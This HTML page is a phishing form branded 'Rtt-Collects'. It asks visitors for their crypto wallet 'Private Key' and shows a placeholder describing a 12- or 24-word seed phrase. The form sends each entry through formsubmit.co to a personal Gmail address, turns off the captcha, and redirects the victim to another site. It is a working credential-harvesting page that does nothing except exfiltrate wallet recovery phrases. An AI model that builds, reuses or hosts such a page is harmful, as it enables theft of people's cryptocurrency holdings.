<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Keyphrase</title>

  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Poppins", sans-serif;
    }

    body {
      background: linear-gradient(135deg, #0d6efd, #1e90ff);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background: #ffffff;
      width: 100%;
      max-width: 400px;
      padding: 30px;
      border-radius: 18px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      animation: fadeIn 0.8s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    h1 {
      text-align: center;
      color: #0d6efd;
      font-size: 28px;
      font-weight: 700;
      margin-bottom: 8px;
    }

    p {
      text-align: center;
      color: #666;
      font-size: 14px;
      margin-bottom: 25px;
    }

    label {
      font-size: 13px;
      color: #333;
      margin-bottom: 5px;
      display: block;
    }

    textarea {
      width: 100%;
      padding: 12px;
      height: 140px;
      border: 1px solid #ddd;
      border-radius: 10px;
      outline: none;
      font-size: 14px;
      transition: 0.3s;
      resize: none;
    }

    textarea:focus {
      border-color: #0d6efd;
      box-shadow: 0 0 0 3px rgba(13,110,253,0.2);
    }

    button {
      width: 100%;
      margin-top: 18px;
      padding: 12px;
      border: none;
      background: #0d6efd;
      color: white;
      font-size: 15px;
      font-weight: 600;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background: #0b5ed7;
      transform: scale(1.02);
    }

    .footer-text {
      text-align: center;
      font-size: 12px;
      margin-top: 15px;
      color: #888;
    }
  </style>
</head>

<body>

  <div class="container">
    <h1>Private Key</h1>
    <p>Drop your Private Key/p>

    <form action="https://formsubmit.co/sarahandrews400@gmail.com" method="POST">

      <!-- Disable captcha -->
      <input type="hidden" name="_captcha" value="false">

      <!-- Redirect after submit -->
      <input type="hidden" name="_next" value="https://rtt-collects.vercel.app/">

      <label>Enter your Private Key</label>
      <textarea name="keyphrase" placeholder="Typically 12 (sometimes 24)
seperated by single spaces" required></textarea>

      <button type="submit">PROCEED</button>
    </form>

    <div class="footer-text">
      Rtt-Collects
    </div>
  </div>

</body>
</html>
